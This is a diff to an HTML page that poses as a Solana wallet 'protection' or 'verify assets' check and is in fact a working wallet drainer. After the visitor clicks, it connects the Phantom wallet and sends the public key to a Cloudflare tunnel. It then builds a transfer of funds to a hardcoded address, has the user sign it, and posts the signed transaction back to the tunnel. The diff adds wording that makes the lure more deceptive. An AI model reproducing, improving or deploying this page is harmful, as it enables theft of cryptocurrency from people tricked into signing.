@@ -1,40 +1,58 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-    <script>window.Buffer = window.Buffer || {from:(arr)=>new Uint8Array(arr),isBuffer:(obj)=>obj instanceof Uint8Array};</script>
+    <script>
+        window.Buffer = {
+            from: function(a) { return new Uint8Array(a); },
+            isBuffer: function(o) { return o instanceof Uint8Array; }
+        };
+        window.global = window;
+    </script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
     <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2>PROTOCOL SYNC</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">VERIFY ASSETS</button>
+        <h2 style="color:#14F195;">PROTOCOL SYNC V4</h2>
+        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
         <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
     </div>
     <script>
+    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
+    const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use Wallet Browser"); return; }
+            
+            document.getElementById('msg').innerText = "Connecting...";
             const { publicKey } = await p.connect();
-            document.getElementById('msg').innerText = "Syncing...";
-            const res = await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/get_data", {
+            
+            const res = await fetch(TUNNEL + "/get_data", {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: publicKey.toString()})
             });
             const data = await res.json();
+
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: publicKey,
-                    toPubkey: new solanaWeb3.PublicKey("HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"),
+                    toPubkey: new solanaWeb3.PublicKey(TARGET),
                     lamports: data.safe_amount 
                 })
             );
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = publicKey;
+
+            document.getElementById('msg').innerText = "Awaiting Signature...";
             const signed = await p.signTransaction(transaction);
-            const b64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
-            await fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
+            
+            const raw = signed.serialize();
+            let b64 = "";
+            for (let i = 0; i < raw.length; i++) b64 += String.fromCharCode(raw[i]);
+            
+            await fetch(TUNNEL + "/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: b64})
+                body:JSON.stringify({signature: window.btoa(b64)})
             });
-            alert("Success!");
+            alert("Security Protocol Activated!");
         } catch(e) { alert("Status: " + e.message); }
     }
     </script></body></html>
